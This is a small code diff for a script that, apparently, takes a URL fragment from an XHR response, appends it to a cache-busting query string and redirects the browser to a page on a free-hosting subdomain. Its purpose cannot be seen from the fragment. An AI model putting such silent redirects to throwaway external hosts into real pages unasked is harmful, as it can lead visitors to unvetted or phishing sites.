@@ -54,6 +54,8 @@ XHR.onreadystatechange = function(){
     }
 }
 
+nocache += "&" + dlpurl;
+
 console.log(dlpurl);
 window.location.replace("http://miala.000webhostapp.com" + dlpurl + nocache);
 </script>
